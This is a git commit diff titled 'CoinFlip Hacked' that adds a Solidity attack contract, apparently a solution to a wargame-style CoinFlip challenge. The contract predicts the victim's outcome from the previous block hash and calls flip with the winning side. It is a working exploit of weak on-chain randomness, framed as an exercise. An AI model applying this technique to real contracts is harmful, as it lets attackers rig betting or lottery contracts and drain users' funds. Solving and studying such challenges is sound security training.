a7f502091792894f836fceecc812767a4a56193d
Poudel0 <poudel0sandesh@gmail.com>
2023-02-09 22:44:09 +0545

    CoinFlip Hacked

--- coinflip/coinflip attack.sol
+++ coinflip/coinflip attack.sol
@@ -1,21 +1,25 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+// Run the FlipAttack function 10 times on remix
+
 import "./coinflip.sol";
-contract CFAttack{
-   uint256 FACTOR =  57896044618658097711785492504343953926634992332820282019728792003956564819968;
-   CoinFlip public vicontract;
-    constructor(address victim){
-        vicontract = CoinFlip(victim)
 
-    }
-    function flipAttack(bool side) public returns(bool){
-            uint256 blockValue = uint256(blockhash(block.number - 1));
-            uint256 coinFlip = blockValue / FACTOR;
-            bool side = coinFlip == 1 ? true : false;
+contract CFAttack {
+    uint256 FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    CoinFlip public vicontract;
 
-            vicontract.flip(side);
-
+    constructor(address victim) {
+        vicontract = CoinFlip(victim);
     }
 
+    function flipAttack() public returns (bool) {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+
+        vicontract.flip(side);
+        return side;
+    }
 }
